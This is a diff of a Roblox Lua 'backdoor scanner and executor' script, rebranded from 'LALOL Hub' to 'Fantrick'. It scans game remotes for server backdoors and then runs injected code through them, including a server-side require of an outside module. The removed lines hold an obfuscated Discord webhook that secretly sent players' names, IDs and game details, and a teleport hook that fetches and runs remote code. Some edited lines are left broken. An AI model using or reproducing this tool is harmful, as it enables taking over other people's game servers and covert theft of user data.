@@ -1,3 +1,6 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
 --[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
@@ -10,36 +13,36 @@
 -- Instances: 33 | Scripts: 3 | Modules: 3
 local G2L = {};
 
--- StarterGui.LALOL Hub Backdoor
+-- StarterGui.Thats_ball Backdoor
 G2L["1"] = Instance.new("ScreenGui", game:GetService('CoreGui'):WaitForChild('RobloxGui'));
-G2L["1"]["Name"] = [[VR9V Backdoor]];
+G2L["1"]["Name"] = [[Thats_ball Backdoor]];
 G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;
 G2L["1"]["ResetOnSpawn"] = false;
 
--- StarterGui.LALOL Hub Backdoor.Frame
+-- StarterGui.Fantrick Backdoor.Frame
 G2L["2"] = Instance.new("Frame", G2L["1"]);
 G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["2"]["Size"] = UDim2.new(0, 482, 0, 276);
 G2L["2"]["Position"] = UDim2.new(0.27320125699043274, 0, 0.3018597960472107, 0);
 
--- StarterGui.LALOL Hub Backdoor.Frame.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.UIStroke
 G2L["3"] = Instance.new("UIStroke", G2L["2"]);
 G2L["3"]["Color"] = Color3.fromRGB(255, 255, 255);
 
--- StarterGui.LALOL Hub Backdoor.Frame.UIStroke.UIGradient
+-- StarterGui.Fantrick Backdoor.Frame.UIStroke.UIGradient
 G2L["4"] = Instance.new("UIGradient", G2L["3"]);
 G2L["4"]["Rotation"] = 50;
 G2L["4"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};
 
--- StarterGui.LALOL Hub Backdoor.Frame.UICorner
+-- StarterGui.Fantrick Backdoor.Frame.UICorner
 G2L["5"] = Instance.new("UICorner", G2L["2"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor
+-- StarterGui.Fantrick Backdoor.Frame.Executor
 G2L["6"] = Instance.new("Folder", G2L["2"]);
 G2L["6"]["Name"] = [[Executor]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Execute
 G2L["7"] = Instance.new("Frame", G2L["6"]);
 G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["7"]["BackgroundTransparency"] = 1;
@@ -47,7 +50,7 @@ G2L["7"]["Size"] = UDim2.new(0, 290, 0, 28);
 G2L["7"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.8708109259605408, 0);
 G2L["7"]["Name"] = [[Execute]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.Button
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Execute.Button
 G2L["8"] = Instance.new("TextButton", G2L["7"]);
 G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["8"]["TextSize"] = 22;
@@ -58,15 +61,15 @@ G2L["8"]["Name"] = [[Button]];
 G2L["8"]["Text"] = [[Execute]];
 G2L["8"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UICorner
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Execute.UICorner
 G2L["9"] = Instance.new("UICorner", G2L["7"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Execute.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Execute.UIStroke
 G2L["a"] = Instance.new("UIStroke", G2L["7"]);
 G2L["a"]["Color"] = Color3.fromRGB(51, 215, 0);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Clear
 G2L["b"] = Instance.new("Frame", G2L["6"]);
 G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["b"]["BackgroundTransparency"] = 1;
@@ -74,7 +77,7 @@ G2L["b"]["Size"] = UDim2.new(0, 162, 0, 28);
 G2L["b"]["Position"] = UDim2.new(0.6400582790374756, 0, 0.8708109855651855, 0);
 G2L["b"]["Name"] = [[Clear]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.Button
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Clear.Button
 G2L["c"] = Instance.new("TextButton", G2L["b"]);
 G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["c"]["TextSize"] = 22;
@@ -85,26 +88,26 @@ G2L["c"]["Name"] = [[Button]];
 G2L["c"]["Text"] = [[Clear]];
 G2L["c"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UICorner
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Clear.UICorner
 G2L["d"] = Instance.new("UICorner", G2L["b"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.Clear.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.Executor.Clear.UIStroke
 G2L["e"] = Instance.new("UIStroke", G2L["b"]);
 G2L["e"]["Color"] = Color3.fromRGB(36, 236, 203);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox
 G2L["f"] = Instance.new("Frame", G2L["6"]);
 G2L["f"]["BackgroundColor3"] = Color3.fromRGB(22, 22, 22);
 G2L["f"]["Size"] = UDim2.new(0, 462, 0, 163);
 G2L["f"]["Position"] = UDim2.new(0.01962907239794731, 0, 0.24310137331485748, 0);
 G2L["f"]["Name"] = [[ExecutorBox]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.UICorner
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.UICorner
 G2L["10"] = Instance.new("UICorner", G2L["f"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox
 G2L["11"] = Instance.new("TextBox", G2L["f"]);
 G2L["11"]["TextSize"] = 14;
 G2L["11"]["TextXAlignment"] = Enum.TextXAlignment.Left;
@@ -115,29 +118,29 @@ G2L["11"]["TextColor3"] = Color3.fromRGB(198, 119, 88);
 G2L["11"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["11"]["MultiLine"] = true;
 G2L["11"]["BackgroundTransparency"] = 1;
-G2L["11"]["PlaceholderText"] = [[require(6666666).load("c00lkidd")]];
+G2L["11"]["PlaceholderText"] = [[Put your require or script here!]];
 G2L["11"]["Size"] = UDim2.new(0, 448, 0, 150);
 G2L["11"]["Text"] = [[]];
 G2L["11"]["Position"] = UDim2.new(0.015692640095949173, 0, 0.042270027101039886, 0);
 G2L["11"]["ClearTextOnFocus"] = false;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
 G2L["12"] = Instance.new("LocalScript", G2L["11"]);
 G2L["12"]["Name"] = [[Highlight]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter
 G2L["13"] = Instance.new("ModuleScript", G2L["12"]);
 G2L["13"]["Name"] = [[Highlighter]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer
 G2L["14"] = Instance.new("ModuleScript", G2L["13"]);
 G2L["14"]["Name"] = [[lexer]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight.Highlighter.lexer.language
 G2L["15"] = Instance.new("ModuleScript", G2L["14"]);
 G2L["15"]["Name"] = [[language]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner
+-- StarterGui.Fantrick Backdoor.Frame.Scanner
 G2L["16"] = Instance.new("Frame", G2L["2"]);
 G2L["16"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["16"]["BackgroundTransparency"] = 1;
@@ -146,20 +149,20 @@ G2L["16"]["Position"] = UDim2.new(0.1166670024394989, 0, 0.30478382110595703, 0)
 G2L["16"]["Visible"] = false;
 G2L["16"]["Name"] = [[Scanner]];
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.UIStroke
 G2L["17"] = Instance.new("UIStroke", G2L["16"]);
 G2L["17"]["Color"] = Color3.fromRGB(255, 255, 255);
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UIStroke.UIGradient
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.UIStroke.UIGradient
 G2L["18"] = Instance.new("UIGradient", G2L["17"]);
 G2L["18"]["Rotation"] = 50;
 G2L["18"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.UICorner
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.UICorner
 G2L["19"] = Instance.new("UICorner", G2L["16"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.Button
 G2L["1a"] = Instance.new("TextButton", G2L["16"]);
 G2L["1a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1a"]["TextSize"] = 43;
@@ -170,40 +173,40 @@ G2L["1a"]["Name"] = [[Button]];
 G2L["1a"]["Text"] = [[Start Scanning]];
 G2L["1a"]["BackgroundTransparency"] = 1;
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIGradient
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.Button.UIGradient
 G2L["1b"] = Instance.new("UIGradient", G2L["1a"]);
 G2L["1b"]["Rotation"] = 50;
 G2L["1b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 255, 108)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 231, 171))};
 
--- StarterGui.LALOL Hub Backdoor.Frame.Scanner.Button.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.Scanner.Button.UIStroke
 G2L["1c"] = Instance.new("UIStroke", G2L["1a"]);
 G2L["1c"]["Color"] = Color3.fromRGB(255, 255, 255);
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel
+-- StarterGui.Fantrick Backdoor.Frame.TextLabel
 G2L["1d"] = Instance.new("TextLabel", G2L["2"]);
 G2L["1d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["1d"]["FontFace"] = Font.new([[rbxassetid://12187365977]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
 G2L["1d"]["TextSize"] = 49;
 G2L["1d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["1d"]["Size"] = UDim2.new(0, 460, 0, 50);
-G2L["1d"]["Text"] = [[VR9V Backdoor]];
+G2L["1d"]["Text"] = [[by Thats_ball Backdoor]];
 G2L["1d"]["BackgroundTransparency"] = 1;
 G2L["1d"]["Position"] = UDim2.new(0.02169983461499214, 0, 0.025362318381667137, 0);
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke
+-- StarterGui.Fantrick Backdoor.Frame.TextLabel.UIStroke
 G2L["1e"] = Instance.new("UIStroke", G2L["1d"]);
 G2L["1e"]["Color"] = Color3.fromRGB(255, 255, 255);
 
--- StarterGui.LALOL Hub Backdoor.Frame.TextLabel.UIStroke.UIGradient
+-- StarterGui.Fantrick Backdoor.Frame.TextLabel.UIStroke.UIGradient
 G2L["1f"] = Instance.new("UIGradient", G2L["1e"]);
 G2L["1f"]["Rotation"] = 50;
 G2L["1f"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 0, 0)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 0, 255))};
 
--- StarterGui.LALOL Hub Backdoor.LocalScript
+-- StarterGui.Fantrick Backdoor.LocalScript
 G2L["20"] = Instance.new("LocalScript", G2L["1"]);
 
 
--- StarterGui.LALOL Hub Backdoor.Dragify
+-- StarterGui.Fantrick Backdoor.Dragify
 G2L["21"] = Instance.new("LocalScript", G2L["1"]);
 G2L["21"]["Name"] = [[Dragify]];
 
@@ -1377,20 +1380,13 @@ return language
 
 end;
 };
--- StarterGui.LALOL Hub Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
+-- StarterGui.Fantrick Backdoor.Frame.Executor.ExecutorBox.TextBox.Highlight
 local function C_12()
 local script = G2L["12"];
 	local Highlighter = require(script.Highlighter)
 	
 	Highlighter.highlight({
-		-- The object to syntax highlight
 		textObject=script.Parent,
-		-- The source text for highlighting- defaults to textObject.Text
-	--	src: string?,
-		-- Update even if there are no changes since last highlight
-	--	forceUpdate=true,
-		-- Lexer for tokenizing src, defaults to the bundled Lua lexer
-	--	lexer=true,
 	})
 	
 	textbox=script.Parent
@@ -1403,12 +1399,12 @@ local script = G2L["12"];
 	end)
 end;
 task.spawn(C_12);
--- StarterGui.LALOL Hub Backdoor.LocalScript
+-- StarterGui.Fantrick Backdoor.LocalScript
 local function C_20()
 local script = G2L["20"];
 	queueteleport = (syn and syn.queue_on_teleport) or queue_on_teleport or (fluxus and fluxus.queue_on_teleport)
 	if queueteleport then
-		queueteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()")
+		queueteleport("")
 	end
 	
 	GUI=script.Parent.Frame
@@ -1416,14 +1412,13 @@ local script = G2L["20"];
 	alphabet={'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
 	
 	backdoor=nil
-	HttpService=game:GetService("HttpService")
 	
 	function debug(text, lvl)
 		local func=print
 		if lvl==1 then func=print end
 		if lvl==2 then func=error end
 		if lvl==3 then func=warn end
-		func('LALOL Hub Backdoor: '..text)
+		func('Fantrick Backdoor: '..text)
 	end
 	
 	function runRemote(remote, data, data2)
@@ -1448,7 +1443,7 @@ local script = G2L["20"];
 		game:GetService('StarterGui'):SetCore(
 			"SendNotification",
 			{
-				Title = "LALOL Hub Backdoor",
+				Title = "Fantrick Backdoor",
 				Duration = 6,
 				Text = text
 			}
@@ -1456,7 +1451,7 @@ local script = G2L["20"];
 	end
 	
 	
-	if _G.LALOL_Hub_Backdoor_Logs_Disabled then
+	if _G.Fantrick_Backdoor_Logs_Disabled then
 		notify('Logs disabled :(')
 	end
 	
@@ -1489,7 +1484,7 @@ local script = G2L["20"];
 				code=generateName(math.random(12,30))
 				if not remotes[code] then break end
 			end
-				spawn(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
+				spawn(function() protected_backdoor:InvokeServer('fantrick backdoor join today!! discord.gg/XXqzxT7E5z', "a=Instance.new('Model',workspace)a.Name='"..code.."'") end)
 				remotes[code]=protected_backdoor
 			end
 		
@@ -1559,25 +1554,9 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
-					runRemote(remote, "a=Instance.new('Hint')a.Text='LALOL Hub Backdoor | discord.gg/XXqzxT7E5z | Free and FASTEST Backdoor Scanner'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
-					
-					local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-					if request and not _G.LALOL_Hub_Backdoor_Logs_Disabled then 
-						request({
-							Url = '\104\116\116\112\115\58\47\47\100\105\115\99\111\114\100\46\99\111\109\47\97\112\105\47\119\101\98\104\111\111\107\115\47\49\49\48\56\54\57\52\49\54\48\52\54\52\49\53\56\55\56\49\47\57\86\67\122\95\99\107\52\117\120\51\77\51\84\81\106\56\109\111\76\68\113\51\78\119\45\100\107\89\68\87\55\103\69\99\97\76\72\75\80\98\101\50\95\74\74\73\122\53\109\50\102\69\104\54\101\83\110\112\51\51\87\79\76\116\103\105\49',
-							Method = 'POST',
-							Headers = {
-								['Content-Type'] = 'application/json',
-							},
-							Body = HttpService:JSONEncode({
-								username='pls dont delete this w3bh00k',
-								content="**User: `"..game:GetService('Players').LocalPlayer.Name..'` | `'..game:GetService('Players').LocalPlayer.UserId..'`\nhttps://www.roblox.com/games/'..game.PlaceId..'\n`'..backdoor:GetFullName()..'`**',
-							})
-						})
-					end
-	
+					runRemote(remote, "''while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					return true
 				end
 --				debug('"'..remote:GetFullName()..'" seems like not backdoor', 1)
@@ -1598,7 +1577,7 @@ local script = G2L["20"];
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
 			spawn(function()
-				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', a) end)
+				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('', a) end)
 				if variantValue~=nil then
 					local splited=string.split(variantValue,':')
 					notify(splited[#splited])
@@ -1640,7 +1619,7 @@ local script = G2L["20"];
 	end)
 end;
 task.spawn(C_20);
--- StarterGui.LALOL Hub Backdoor.Dragify
+-- StarterGui.Fantrick Backdoor.Dragify
 local function C_21()
 local script = G2L["21"];
 	local UIS = game:GetService("UserInputService")
